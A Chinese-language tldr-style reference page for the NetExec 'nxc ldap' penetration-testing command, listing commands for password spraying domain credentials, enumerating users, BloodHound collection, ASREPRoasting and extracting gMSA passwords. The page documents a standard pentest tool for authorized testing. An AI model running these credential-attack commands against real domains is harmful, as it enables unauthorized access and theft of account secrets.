# nxc ldap

> 通过 LDAP 渗透测试和利用 Windows Active Directory 域。
> 更多信息：<https://www.netexec.wiki/ldap-protocol>.

- 通过尝试指定的用户名和密码列表中的每一个组合来查找有效的域凭据：

`nxc ldap {{192.168.178.2}} -u {{path/to/usernames.txt}} -p {{path/to/passwords.txt}}`

- 枚举活动的域用户：

`nxc ldap {{192.168.178.2}} -u {{username}} -p {{password}} --active-users`

- 收集有关目标域的数据，并自动将这些数据导入 BloodHound：

`nxc ldap {{192.168.178.2}} -u {{username}} -p {{password}} --bloodhound --collection {{All}}`

- 尝试为指定用户收集 AS_REP 消息以执行 ASREPRoasting 攻击：

`nxc ldap {{192.168.178.2}} -u {{username}} -p '' --asreproast {{path/to/output.txt}}`

- 尝试提取域中组管理服务账户的密码：

`nxc ldap {{192.168.178.2}} -u {{username}} -p {{password}} --gmsa`